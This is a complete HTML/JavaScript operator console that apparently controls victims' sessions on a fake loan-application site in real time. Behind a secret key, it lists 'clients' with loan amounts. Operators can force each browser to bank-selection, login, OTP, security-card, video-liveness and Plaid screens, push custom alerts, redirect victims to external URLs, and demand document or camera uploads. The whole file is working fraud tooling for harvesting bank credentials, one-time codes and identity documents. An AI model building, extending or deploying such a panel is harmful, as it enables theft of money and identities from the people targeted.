<!DOCTYPE html>
<html lang="en" data-theme="dark" data-accent="green">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<meta name="robots" content="noindex, nofollow">
<title>Admin Console</title>
<style>
:root{
  --bg:#0d1117; --bg2:#161b22; --bg3:#1c2430; --line:#2a3441;
  --fg:#e6edf3; --fg2:#9aa7b4; --fg3:#63707d;
  --danger:#e74c3c; --warn:#f39c12; --ok:#22c55e;
  --accent:#00ad6a; --accent-soft:rgba(0,173,106,.15);
  --radius:10px; --mono:ui-monospace,SFMono-Regular,Menlo,monospace;
}
html[data-theme="light"]{
  --bg:#f4f6f8; --bg2:#ffffff; --bg3:#eef1f4; --line:#dde3e9;
  --fg:#141b22; --fg2:#5a6672; --fg3:#8a95a1;
}
html[data-accent="cyan"]{ --accent:#00b3c7; --accent-soft:rgba(0,179,199,.15); }
*{box-sizing:border-box;margin:0;padding:0}
body{
  background:var(--bg); color:var(--fg);
  font:14px/1.5 -apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;
  min-height:100vh;
}
button,input,select,textarea{font:inherit;color:inherit}
button{cursor:pointer;border:none;background:none}

/* unlock */
#lock{position:fixed;inset:0;background:var(--bg);display:flex;align-items:center;justify-content:center;z-index:100;padding:20px}
#lock.hidden{display:none}
.lock-card{width:100%;max-width:380px;background:var(--bg2);border:1px solid var(--line);border-radius:14px;padding:30px}
.lock-card h1{font-size:19px;margin-bottom:6px}
.lock-card p{color:var(--fg2);font-size:13px;margin-bottom:20px}
.field{margin-bottom:12px}
.field label{display:block;font-size:11px;text-transform:uppercase;letter-spacing:.6px;color:var(--fg3);margin-bottom:6px;font-weight:600}
.inp{width:100%;padding:11px 13px;background:var(--bg3);border:1px solid var(--line);border-radius:8px;outline:none}
.inp:focus{border-color:var(--accent);box-shadow:0 0 0 3px var(--accent-soft)}
.btn{padding:11px 16px;border-radius:8px;font-weight:600;font-size:13px;background:var(--bg3);border:1px solid var(--line);transition:.15s}
.btn:hover:not(:disabled){border-color:var(--fg3)}
.btn:disabled{opacity:.4;cursor:not-allowed}
.btn-primary{background:var(--accent);border-color:var(--accent);color:#04150e}
.btn-primary:hover:not(:disabled){filter:brightness(1.1)}
.btn-danger{background:rgba(231,76,60,.14);border-color:rgba(231,76,60,.4);color:#ff8679}
.btn-warn{background:rgba(243,156,18,.14);border-color:rgba(243,156,18,.4);color:#f5b95a}
.btn-block{width:100%}
.err{color:var(--danger);font-size:12.5px;margin-top:10px;min-height:16px}

/* shell */
#app{display:none;grid-template-rows:auto 1fr;height:100vh}
#app.on{display:grid}
header{
  display:flex;align-items:center;gap:14px;padding:10px 16px;
  background:var(--bg2);border-bottom:1px solid var(--line);flex-wrap:wrap;
}
.brand{font-weight:700;letter-spacing:.3px}
.brand span{color:var(--accent)}
.spacer{flex:1}
.pill{display:flex;align-items:center;gap:6px;font-size:12px;color:var(--fg2);background:var(--bg3);border:1px solid var(--line);padding:5px 11px;border-radius:20px}
.dot{width:7px;height:7px;border-radius:50%;background:var(--fg3)}
.dot.on{background:var(--ok);box-shadow:0 0 0 3px rgba(34,197,94,.18)}
.dot.wake{background:var(--warn);animation:blink 1s infinite}
.dot.off{background:var(--danger)}
@keyframes blink{50%{opacity:.25}}
.tog{display:flex;border:1px solid var(--line);border-radius:8px;overflow:hidden}
.tog button{padding:6px 10px;font-size:11.5px;color:var(--fg2)}
.tog button.sel{background:var(--accent);color:#04150e;font-weight:700}

main{display:grid;grid-template-columns:minmax(300px,380px) 1fr;overflow:hidden}
@media(max-width:860px){main{grid-template-columns:1fr;grid-template-rows:auto 1fr}}
#listcol{border-right:1px solid var(--line);overflow-y:auto;padding:14px}
.sec-head{display:flex;align-items:center;gap:8px;font-size:11px;text-transform:uppercase;letter-spacing:.7px;color:var(--fg3);font-weight:700;margin:16px 0 8px}
.sec-head:first-child{margin-top:0}
.count{background:var(--bg3);border:1px solid var(--line);border-radius:10px;padding:0 7px;color:var(--fg2)}
.card{background:var(--bg2);border:1px solid var(--line);border-radius:var(--radius);padding:11px 12px;margin-bottom:8px;cursor:pointer;transition:.15s}
.card:hover{border-color:var(--fg3)}
.card.sel{border-color:var(--accent);background:var(--accent-soft)}
.card.dead{opacity:.55}
.card-top{display:flex;align-items:center;gap:8px;margin-bottom:5px}
.sid{font-family:var(--mono);font-size:11.5px;color:var(--fg2)}
.cname{font-weight:600;font-size:13px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap}
.meta{font-size:11.5px;color:var(--fg3);display:flex;gap:10px;flex-wrap:wrap}
.tag{font-size:10.5px;font-weight:700;padding:1px 7px;border-radius:5px;text-transform:uppercase;letter-spacing:.4px}
.tag.pg{background:var(--bg3);color:var(--fg2);border:1px solid var(--line)}
.tag.live{background:rgba(34,197,94,.14);color:#5ce08e;border:1px solid rgba(34,197,94,.35)}
.tag.gone{background:rgba(231,76,60,.12);color:#ff8679;border:1px solid rgba(231,76,60,.3)}
#panelcol{overflow-y:auto;padding:18px 22px}
.empty{color:var(--fg3);font-size:13px;text-align:center;padding:60px 20px;line-height:1.7}
.phead{display:flex;align-items:center;gap:10px;margin-bottom:4px}
.phead h2{font-size:16px}
.pmeta{font-family:var(--mono);font-size:11.5px;color:var(--fg3);margin-bottom:16px;word-break:break-all}
.group{background:var(--bg2);border:1px solid var(--line);border-radius:var(--radius);padding:14px;margin-bottom:12px}
.group h3{font-size:11px;text-transform:uppercase;letter-spacing:.7px;color:var(--fg3);margin-bottom:11px}
.row{display:flex;gap:8px;flex-wrap:wrap}
.row>*{flex:1;min-width:120px}
textarea.inp{resize:vertical;min-height:74px;font-family:inherit}
.voice{color:var(--fg3);font-size:11.5px;margin-top:8px;line-height:1.5}
.expired{background:rgba(231,76,60,.1);border:1px solid rgba(231,76,60,.3);border-radius:var(--radius);padding:11px 13px;font-size:12.5px;color:#ff8679;margin-bottom:12px}
.urlrow{display:flex;gap:8px}
.urlrow .inp{flex:1;min-width:0}
.paste{flex:0 0 auto;padding:0 13px;border-radius:8px;border:1px solid var(--line);background:var(--bg3);font-size:12px;font-weight:600;color:var(--fg2)}
.paste:hover{border-color:var(--fg3)}
.chkrow{display:flex;gap:16px;flex-wrap:wrap;margin-bottom:10px}
.chkrow label{display:flex;gap:7px;align-items:center;font-size:12.5px;color:var(--fg2);cursor:pointer}
#toasts{position:fixed;bottom:18px;right:18px;display:flex;flex-direction:column;gap:8px;z-index:200}
.toast{background:var(--bg3);border:1px solid var(--line);border-left:3px solid var(--accent);padding:10px 14px;border-radius:8px;font-size:12.5px;max-width:320px;animation:in .2s}
@keyframes in{from{opacity:0;transform:translateY(8px)}}
</style>
</head>
<body>

<div id="lock">
  <div class="lock-card">
    <h1>Admin Console</h1>
    <p>Enter the admin secret key to unlock.</p>
    <div class="field">
      <label for="key">Admin Secret Key</label>
      <input id="key" class="inp" type="password" autocomplete="current-password" spellcheck="false">
    </div>
    <button id="unlock" class="btn btn-primary btn-block">Unlock</button>
    <div class="err" id="lockerr"></div>
  </div>
</div>

<div id="app">
  <header>
    <div class="brand">Admin <span>Console</span></div>
    <div class="pill"><span class="dot off" id="sdot"></span><span id="stxt">Offline</span></div>
    <div class="spacer"></div>
    <div class="tog">
      <button id="th-dark" class="sel">Dark</button>
      <button id="th-light">Light</button>
    </div>
    <div class="tog">
      <button id="ac-green" class="sel">Green</button>
      <button id="ac-cyan">Cyan</button>
    </div>
    <button class="btn" id="refresh">Refresh</button>
    <button class="btn" id="lockbtn">Lock</button>
  </header>

  <main>
    <div id="listcol">
      <div class="sec-head">Active <span class="count" id="c-active">0</span></div>
      <div id="list-active"></div>
      <div class="sec-head">Inactive <span class="count" id="c-inactive">0</span></div>
      <div id="list-inactive"></div>
    </div>
    <div id="panelcol">
      <div class="empty" id="empty">Select a session to issue commands.</div>
      <div id="panel" style="display:none"></div>
    </div>
  </main>
</div>

<div id="toasts"></div>

<script>
(function () {
  'use strict';

  var STALE_MS = 30 * 60 * 1000;
  var K = 'lt_admin_key';

  var S = {
    key: sessionStorage.getItem(K) || '',
    ws: null,
    authed: false,
    retry: 0,
    timer: null,
    keep: null,
    poll: null,
    sessions: [],
    sel: null,
    tick: null,
    listSig: '',
    panelSig: '',
    panelSid: null
  };

  var $ = function (id) { return document.getElementById(id); };

  function toast(msg, kind) {
    var t = document.createElement('div');
    t.className = 'toast';
    if (kind === 'err') t.style.borderLeftColor = 'var(--danger)';
    if (kind === 'ok') t.style.borderLeftColor = 'var(--ok)';
    t.textContent = msg;
    $('toasts').appendChild(t);
    setTimeout(function () { t.remove(); }, 4200);
  }

  function esc(v) {
    return String(v == null ? '' : v)
      .replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;')
      .replace(/"/g, '&quot;');
  }

  // ── theme ────────────────────────────────────────────────
  function theme(dark, accent) {
    document.documentElement.dataset.theme = dark ? 'dark' : 'light';
    document.documentElement.dataset.accent = accent;
    $('th-dark').classList.toggle('sel', dark);
    $('th-light').classList.toggle('sel', !dark);
    $('ac-green').classList.toggle('sel', accent === 'green');
    $('ac-cyan').classList.toggle('sel', accent === 'cyan');
    localStorage.setItem('lt_admin_theme', dark ? 'dark' : 'light');
    localStorage.setItem('lt_admin_accent', accent);
  }
  theme(localStorage.getItem('lt_admin_theme') !== 'light',
        localStorage.getItem('lt_admin_accent') || 'green');
  $('th-dark').onclick = function () { theme(true, document.documentElement.dataset.accent); };
  $('th-light').onclick = function () { theme(false, document.documentElement.dataset.accent); };
  $('ac-green').onclick = function () { theme(document.documentElement.dataset.theme === 'dark', 'green'); };
  $('ac-cyan').onclick = function () { theme(document.documentElement.dataset.theme === 'dark', 'cyan'); };

  // ── status ───────────────────────────────────────────────
  function status(kind, text) {
    var d = $('sdot');
    d.className = 'dot ' + (kind === 'on' ? 'on' : kind === 'wake' ? 'wake' : 'off');
    $('stxt').textContent = text;
  }

  // ── websocket ────────────────────────────────────────────
  function connect() {
    if (!S.key) return;
    if (S.ws && (S.ws.readyState === 0 || S.ws.readyState === 1)) return;

    var proto = location.protocol === 'https:' ? 'wss:' : 'ws:';
    status('wake', S.retry > 2 ? 'Waking backend…' : 'Connecting…');

    var ws;
    try { ws = new WebSocket(proto + '//' + location.host + '/ws/admin'); }
    catch (e) { schedule(); return; }
    S.ws = ws;

    ws.onopen = function () {
      ws.send(JSON.stringify({ type: 'auth', token: S.key }));
    };

    ws.onmessage = function (ev) {
      var msg;
      try { msg = JSON.parse(ev.data); } catch (e) { return; }

      if (msg.type === 'auth_error') {
        $('lockerr').textContent = msg.reason === 'timeout'
          ? 'Auth timed out. Try again.'
          : 'Key rejected. Try again.';
        return;
      }

      if (msg.type === 'auth_ok') {
        S.authed = true;
        S.retry = 0;
        $('lockerr').textContent = '';
        status('on', 'Live');
        $('lock').classList.add('hidden');
        $('app').classList.add('on');
        stopPoll();
        ws.send(JSON.stringify({ type: 'admin_refresh_sessions' }));
        return;
      }

      if (msg.type === 'session_list') {
        S.sessions = msg.sessions || [];
        render();
      }
    };

    ws.onclose = function (e) {
      S.ws = null;
      var wasAuthed = S.authed;
      S.authed = false;

      if (e.code === 4001) {
        sessionStorage.removeItem(K);
        S.key = '';
        if (S.timer) { clearTimeout(S.timer); S.timer = null; }
        stopPoll();
        status('off', 'Offline');
        $('app').classList.remove('on');
        $('lock').classList.remove('hidden');
        if (!$('lockerr').textContent) $('lockerr').textContent = 'Key rejected. Try again.';
        return;
      }
      if (wasAuthed) {
        status('wake', 'Reconnecting…');
        startPoll();
      }
      schedule();
    };

    ws.onerror = function () { /* onclose handles */ };
  }

  function schedule() {
    if (S.timer) return;
    var delay = Math.min(1000 * Math.pow(1.7, S.retry), 15000);
    S.retry++;
    if (S.retry > 3) status('wake', 'Waking backend… (cold start)');
    S.timer = setTimeout(function () { S.timer = null; connect(); }, delay);
  }

  function send(obj) {
    if (!S.ws || S.ws.readyState !== 1 || !S.authed) { toast('Not connected', 'err'); return false; }
    S.ws.send(JSON.stringify(obj));
    return true;
  }

  // ── keepalive: also keeps Render awake ───────────────────
  function startKeep() {
    if (S.keep) clearInterval(S.keep);
    S.keep = setInterval(function () {
      if (S.ws && S.ws.readyState === 1 && S.authed) {
        S.ws.send(JSON.stringify({ type: 'admin_refresh_sessions' }));
      }
    }, 25000);
  }
  startKeep();

  // ── REST fallback poll while socket is down ──────────────
  function startPoll() {
    if (S.poll || !S.key) return;
    S.poll = setInterval(function () {
      if (S.ws && S.ws.readyState === 1) return;
      fetch('/admin/sessions', { headers: { Authorization: 'Bearer ' + S.key } })
        .then(function (r) { return r.ok ? r.json() : null; })
        .then(function (d) { if (d && d.sessions) { S.sessions = d.sessions; render(); } })
        .catch(function () {});
    }, 60000);
  }
  function stopPoll() {
    if (S.poll) { clearInterval(S.poll); S.poll = null; }
  }

  // ── age helpers ──────────────────────────────────────────
  function ageStr(iso) {
    if (!iso) return 'never';
    var ms = Date.now() - new Date(iso).getTime();
    if (ms < 60000) return Math.max(1, Math.round(ms / 1000)) + 's ago';
    if (ms < 3600000) return Math.round(ms / 60000) + 'm ago';
    return Math.round(ms / 3600000) + 'h ago';
  }

  function isStale(s) {
    if (!s.last_heartbeat) return true;
    return (Date.now() - new Date(s.last_heartbeat).getTime()) > STALE_MS;
  }

  // ── render: signature-gated so the panel is not rebuilt every tick ──
  function listSig() {
    return S.sessions.map(function (s) {
      return s.session_id + (isStale(s) ? '1' : '0') + '|' +
             (s.current_page || '') + '|' + (s.current_step || '');
    }).join('~') + '@' + (S.sel || '');
  }

  function panelSig(s) {
    return s.session_id + '|' + (isStale(s) ? '1' : '0') + '|' +
           (s.current_page || '') + '|' + (s.current_step || '');
  }

  function render() {
    var sig = listSig();
    if (sig !== S.listSig) { S.listSig = sig; renderList(); }
    else { updateAges(); }
    renderPanel();
  }

  function updateAges() {
    var nodes = document.querySelectorAll('[data-age]');
    for (var i = 0; i < nodes.length; i++) {
      var sid = nodes[i].getAttribute('data-age');
      var s = S.sessions.filter(function (x) { return x.session_id === sid; })[0];
      if (s) nodes[i].textContent = ageStr(s.last_heartbeat);
    }
  }

  function card(s) {
    var dead = isStale(s);
    var el = document.createElement('div');
    el.className = 'card' + (dead ? ' dead' : '') + (S.sel === s.session_id ? ' sel' : '');

    var app = s.applications || {};
    var top = document.createElement('div');
    top.className = 'card-top';
    var cn = document.createElement('div');
    cn.className = 'cname';
    cn.textContent = app.client_name || 'Unknown client';
    top.appendChild(cn);
    el.appendChild(top);

    var sid = document.createElement('div');
    sid.className = 'sid';
    sid.textContent = String(s.session_id || '').slice(0, 18) + '…';
    el.appendChild(sid);

    var meta = document.createElement('div');
    meta.className = 'meta';
    var pg = document.createElement('span');
    pg.className = 'tag pg';
    pg.textContent = s.current_page || 'unknown';
    meta.appendChild(pg);
    if (s.current_step) {
      var st = document.createElement('span');
      st.className = 'tag pg';
      st.textContent = s.current_step;
      meta.appendChild(st);
    }
    var live = document.createElement('span');
    live.className = 'tag ' + (dead ? 'gone' : 'live');
    live.textContent = dead ? 'expired' : (s._status || 'idle');
    meta.appendChild(live);
    var seen = document.createElement('span');
    seen.setAttribute('data-age', s.session_id);
    seen.textContent = ageStr(s.last_heartbeat);
    meta.appendChild(seen);
    el.appendChild(meta);

    el.onclick = function () { S.sel = s.session_id; render(); };
    return el;
  }

  function renderList() {
    var active = [], inactive = [];
    S.sessions.forEach(function (s) { (isStale(s) ? inactive : active).push(s); });

    $('c-active').textContent = active.length;
    $('c-inactive').textContent = inactive.length;

    var la = $('list-active'), li = $('list-inactive');
    la.innerHTML = ''; li.innerHTML = '';
    if (!active.length) la.innerHTML = '<div class="empty" style="padding:24px 8px">No active sessions.</div>';
    if (!inactive.length) li.innerHTML = '<div class="empty" style="padding:24px 8px">None.</div>';
    active.forEach(function (s) { la.appendChild(card(s)); });
    inactive.forEach(function (s) { li.appendChild(card(s)); });
  }

  function renderPanel() {
    var cur = S.sessions.filter(function (s) { return s.session_id === S.sel; })[0];

    if (!cur) {
      $('panel').style.display = 'none';
      $('empty').style.display = 'block';
      S.panelSig = '';
      S.panelSid = null;
      return;
    }

    var sig = panelSig(cur);
    if (sig === S.panelSig) { updatePanelMeta(cur); return; }

    var sameSess = S.panelSid === cur.session_id;
    var keep = sameSess ? snapshot() : null;

    S.panelSig = sig;
    S.panelSid = cur.session_id;
    buildPanel(cur);

    if (keep) restore(keep);
  }

  function updatePanelMeta(s) {
    var seen = document.getElementById('p-seen');
    if (seen) seen.textContent = ageStr(s.last_heartbeat);
    var exp = document.getElementById('p-expired');
    if (exp) exp.style.display = isStale(s) ? 'block' : 'none';
  }

  function snapshot() {
    var out = {};
    var nodes = document.querySelectorAll('#panel [data-keep]');
    for (var i = 0; i < nodes.length; i++) {
      var el = nodes[i];
      if (!el.id) continue;
      out[el.id] = el.type === 'checkbox' ? el.checked : el.value;
    }
    return out;
  }

  function restore(vals) {
    Object.keys(vals).forEach(function (id) {
      var el = document.getElementById(id);
      if (!el) return;
      if (el.type === 'checkbox') el.checked = vals[id];
      else el.value = vals[id];
    });
  }

  // ── command panel (built once per session/state change) ──
  function buildPanel(s) {
    var dead = isStale(s);
    var app = s.applications || {};
    var p = $('panel');
    $('empty').style.display = 'none';
    p.style.display = 'block';

    p.innerHTML =
      '<div class="expired" id="p-expired" style="display:' + (dead ? 'block' : 'none') + '">' +
        'Session expired — read only. The client must restart to reconnect.</div>' +

      '<div class="phead"><h2>' + esc(app.client_name || 'Unknown client') + '</h2></div>' +
      '<div class="pmeta">' + esc(s.session_id) +
        '<br>app ' + esc(s.application_id || '—') +
        ' · loan ' + esc(app.loan_amount || '—') +
        ' · page ' + esc(s.current_page || '—') +
        ' · step ' + esc(s.current_step || '—') +
        ' · seen <span id="p-seen">' + ageStr(s.last_heartbeat) + '</span></div>' +

      '<div class="group"><h3>Force navigation</h3>' +
        '<div class="row">' +
          '<select class="inp" id="f-page" data-keep>' +
            '<option value="">— page —</option>' +
            '<option value="INDEX">INDEX (landing)</option>' +
            '<option value="CONTRACT">CONTRACT (page 2)</option>' +
            '<option value="PLAID">PLAID (page 3)</option>' +
            '<option value="SUCCESS">SUCCESS (page 4)</option>' +
          '</select>' +
          '<select class="inp" id="f-screen" data-keep>' +
            '<option value="">— screen (optional) —</option>' +
            '<option value="formA">formA</option>' +
            '<option value="formB">formB</option>' +
            '<option value="formC">formC</option>' +
            '<option value="initial">initial</option>' +
            '<option value="bankSelection">bankSelection</option>' +
            '<option value="login">login</option>' +
            '<option value="otp">otp</option>' +
            '<option value="securityCard">securityCard</option>' +
            '<option value="videoLiveness">videoLiveness</option>' +
          '</select>' +
        '</div>' +
        '<button class="btn btn-primary btn-block" id="do-nav" style="margin-top:8px">Navigate</button>' +
        '<div class="voice">A screen implies its own page and overrides the page picker.</div>' +
      '</div>' +

      '<div class="group"><h3>Custom modal</h3>' +
        '<div class="field"><label>Header</label>' +
          '<input class="inp" id="m-head" data-keep value="Notice"></div>' +
        '<div class="field"><label>Colour</label>' +
          '<select class="inp" id="m-var" data-keep>' +
            '<option value="info">Blue — info</option>' +
            '<option value="action">Blue — action</option>' +
            '<option value="warning">Amber — warning</option>' +
            '<option value="required">Red — required</option>' +
            '<option value="success">Green — success</option>' +
          '</select>' +
        '</div>' +
        '<div class="field"><label>Message</label>' +
          '<textarea class="inp" id="m-body" data-keep placeholder="Message shown to the client"></textarea></div>' +
        '<div class="field"><label>OK button label</label>' +
          '<input class="inp" id="m-ok" data-keep value="OK"></div>' +
        '<div class="chkrow">' +
          '<label><input type="checkbox" id="m-up" data-keep> Upload button</label>' +
          '<label><input type="checkbox" id="m-cam" data-keep> Camera button</label>' +
        '</div>' +
        '<button class="btn btn-primary btn-block" id="do-modal">Send modal</button>' +
        '<div class="voice">Upload and camera open a file picker or the device camera, then push the file to the backend.</div>' +
      '</div>' +

      '<div class="group"><h3>Redirect to external URL</h3>' +
        '<div class="field"><label>Header</label>' +
          '<input class="inp" id="r-title" data-keep value="Action Required"></div>' +
        '<div class="field"><label>External URL</label>' +
          '<div class="urlrow">' +
            '<input class="inp" id="r-url" data-keep autocomplete="off" spellcheck="false" placeholder="https://…">' +
            '<button class="paste" id="r-paste" type="button">Paste</button>' +
          '</div>' +
        '</div>' +
        '<div class="field"><label>Message</label>' +
          '<textarea class="inp" id="r-msg" data-keep>You will be taken to an external page in a new tab. Keep this tab open and return here once you are done.</textarea></div>' +
        '<div class="field"><label>OK button label</label>' +
          '<input class="inp" id="r-ok" data-keep value="Open in New Tab"></div>' +
        '<button class="btn btn-primary btn-block" id="do-redir">Send redirect</button>' +
        '<div class="voice">Client sees the modal, presses OK, and the URL opens in a new tab behind it.</div>' +
      '</div>' +

      '<div class="group"><h3>Loader</h3>' +
        '<div class="field"><label>Message</label>' +
          '<input class="inp" id="l-msg" data-keep value="Please wait…"></div>' +
        '<div class="row">' +
          '<button class="btn" id="do-load">Show</button>' +
          '<button class="btn" id="do-unload">Hide</button>' +
        '</div>' +
      '</div>' +

      '<div class="group"><h3>Document request</h3>' +
        '<div class="field"><label>Prompt</label>' +
          '<input class="inp" id="u-prompt" data-keep value="Please upload the requested document."></div>' +
        '<div class="field"><label>Source</label>' +
          '<select class="inp" id="u-type" data-keep>' +
            '<option value="both">Library or camera</option>' +
            '<option value="library">Library only</option>' +
            '<option value="camera">Camera only</option>' +
          '</select>' +
        '</div>' +
        '<button class="btn btn-primary btn-block" id="do-upload">Request upload</button>' +
      '</div>' +

      '<div class="group"><h3>Session</h3>' +
        '<div class="row">' +
          '<button class="btn btn-warn" id="do-lock">Lock</button>' +
          '<button class="btn" id="do-unlock">Unlock</button>' +
        '</div>' +
        '<div class="field" style="margin-top:10px"><label>Toast</label>' +
          '<input class="inp" id="t-txt" data-keep placeholder="Short notice"></div>' +
        '<button class="btn btn-block" id="do-toast">Send toast</button>' +
      '</div>';

    var ids = ['do-nav','do-modal','do-redir','do-load','do-unload','do-lock','do-unlock','do-upload','do-toast'];
    if (dead) ids.forEach(function (id) { var e = $(id); if (e) e.disabled = true; });

    $('do-nav').onclick = function () {
      var page = $('f-page').value, screen = $('f-screen').value;
      if (!page && !screen) return toast('Pick a page or a screen', 'err');
      if (send({ type: 'admin_force_navigate', sessionId: s.session_id,
                 payload: { target_page: page || null, target_screen: screen || null } }))
        toast('Navigation sent', 'ok');
    };

    $('do-modal').onclick = function () {
      var body = $('m-body').value.trim();
      if (!body) return toast('Message required', 'err');
      if (send({ type: 'admin_force_modal', sessionId: s.session_id, payload: {
        header:     $('m-head').value.trim() || 'Notice',
        variant:    $('m-var').value,
        body:       body,
        okLabel:    $('m-ok').value.trim() || 'OK',
        showUpload: $('m-up').checked,
        showCamera: $('m-cam').checked
      } })) toast('Modal sent', 'ok');
    };

    $('r-paste').onclick = function () {
      if (!navigator.clipboard || !navigator.clipboard.readText) {
        $('r-url').focus();
        return toast('Clipboard unavailable — paste manually', 'err');
      }
      navigator.clipboard.readText().then(function (txt) {
        if (txt) { $('r-url').value = txt.trim(); toast('Pasted', 'ok'); }
        else { $('r-url').focus(); }
      }).catch(function () {
        $('r-url').focus();
        toast('Clipboard blocked — paste manually', 'err');
      });
    };

    $('do-redir').onclick = function () {
      var url = $('r-url').value.trim();
      if (!/^https?:\/\/[^\s]+\.[^\s]+/i.test(url)) return toast('URL must start with http(s)://', 'err');
      if (send({ type: 'admin_redirect', sessionId: s.session_id, payload: {
        url:     url,
        header:  $('r-title').value.trim() || 'Action Required',
        body:    $('r-msg').value.trim() || 'You will be taken to an external page in a new tab.',
        variant: 'required',
        okLabel: $('r-ok').value.trim() || 'Open in New Tab'
      } })) toast('Redirect sent', 'ok');
    };

    $('do-load').onclick = function () {
      if (send({ type: 'admin_force_loader', sessionId: s.session_id,
                 action: 'show', message: $('l-msg').value.trim() || 'Please wait…' }))
        toast('Loader shown', 'ok');
    };
    $('do-unload').onclick = function () {
      if (send({ type: 'admin_force_loader', sessionId: s.session_id, action: 'hide' }))
        toast('Loader hidden', 'ok');
    };
    $('do-upload').onclick = function () {
      if (send({ type: 'admin_request_upload', sessionId: s.session_id, payload: {
        prompt:      $('u-prompt').value.trim() || 'Please upload the requested document.',
        upload_type: $('u-type').value
      } })) toast('Upload requested', 'ok');
    };
    $('do-lock').onclick = function () {
      if (send({ type: 'admin_lock_session', sessionId: s.session_id,
                 message: 'Session paused by admin.' })) toast('Locked', 'ok');
    };
    $('do-unlock').onclick = function () {
      if (send({ type: 'admin_unlock_session', sessionId: s.session_id })) toast('Unlocked', 'ok');
    };
    $('do-toast').onclick = function () {
      var txt = $('t-txt').value.trim();
      if (!txt) return toast('Toast text required', 'err');
      if (send({ type: 'admin_send_toast', sessionId: s.session_id,
                 payload: { type: 'info', text: txt } })) toast('Toast sent', 'ok');
    };
  }

  // ── unlock / lock ────────────────────────────────────────
  $('unlock').onclick = function () {
    var v = $('key').value.trim();
    if (!v) { $('lockerr').textContent = 'Key required.'; return; }
    S.key = v;
    sessionStorage.setItem(K, v);
    $('lockerr').textContent = '';
    $('unlock').disabled = true;
    connect();
    setTimeout(function () { $('unlock').disabled = false; }, 1200);
  };
  $('key').addEventListener('keydown', function (e) { if (e.key === 'Enter') $('unlock').click(); });

  $('lockbtn').onclick = function () {
    sessionStorage.removeItem(K);
    S.key = '';
    S.authed = false;
    if (S.timer) { clearTimeout(S.timer); S.timer = null; }
    stopPoll();
    if (S.ws) { try { S.ws.close(); } catch (e) {} S.ws = null; }
    S.sessions = [];
    S.sel = null;
    S.listSig = ''; S.panelSig = ''; S.panelSid = null;
    $('app').classList.remove('on');
    $('lock').classList.remove('hidden');
    $('key').value = '';
    status('off', 'Offline');
    $('key').focus();
  };

  $('refresh').onclick = function () {
    if (send({ type: 'admin_refresh_sessions' })) toast('Refreshed', 'ok');
  };

  // ages tick — cheap, never rebuilds a live panel
  S.tick = setInterval(function () {
    if (S.sessions.length) { updateAges(); renderPanel(); }
  }, 1000);

  document.addEventListener('visibilitychange', function () {
    if (!document.hidden) connect();
  });

  if (S.key) { connect(); } else { $('key').focus(); }
})();
</script>
</body>
</html>
